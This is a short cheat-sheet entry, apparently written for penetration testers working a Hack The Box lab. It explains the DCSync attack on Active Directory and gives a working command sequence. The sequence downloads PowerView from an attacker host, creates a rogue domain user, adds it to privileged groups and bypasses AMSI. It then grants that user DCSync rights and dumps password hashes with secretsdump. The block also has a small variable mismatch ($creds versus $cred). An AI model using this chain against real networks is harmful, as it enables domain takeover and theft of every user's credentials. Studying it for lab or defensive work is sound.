## DCSync
> DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

> The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

> To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

```powershell
Invoke-WebRequest -Uri http://10.10.14.8:8000/PowerView.ps1 -OutFile PowerView.ps1
. ./PowerView.ps1
net user john john@123 /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add

Bypass-4MSI
menu
$passwd = ConvertTo-SecureString "john@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("HTB\john", $passwd)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
```